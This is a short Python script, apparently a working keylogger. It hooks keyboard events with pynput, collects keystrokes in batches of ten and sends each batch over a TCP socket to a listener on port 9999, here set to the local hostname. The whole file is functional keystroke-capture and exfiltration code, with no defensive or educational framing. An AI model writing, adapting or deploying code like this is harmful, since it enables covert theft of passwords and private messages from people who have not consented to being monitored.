from pynput.keyboard import Key, Listener
import socket 

#threshold for max amount of keys needed before sending
THRESHOLD = 10
#keeps track of keys
global keys
keys = []

# create a socket object 
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# get host and port to condnect to 
host = socket.gethostname() 
port = 9999 

# connection to host on the desired port. 
clientsocket.connect((host, port)) 

def lst_to_str(keys):
    res = ""
    for s in keys:
        res += s
    return res

#handles action on key press
def on_press(key):
    keys.append(str(key).replace("'",""))
    if len(keys) == THRESHOLD:
        clientsocket.send(lst_to_str(keys).encode())
        keys.clear()

#handles action on key release
def on_release(key):
    if key == Key.esc:
        return False

listener = Listener(on_press=on_press,on_release=on_release)
listener.start()
listener.join()

clientsocket.close() 

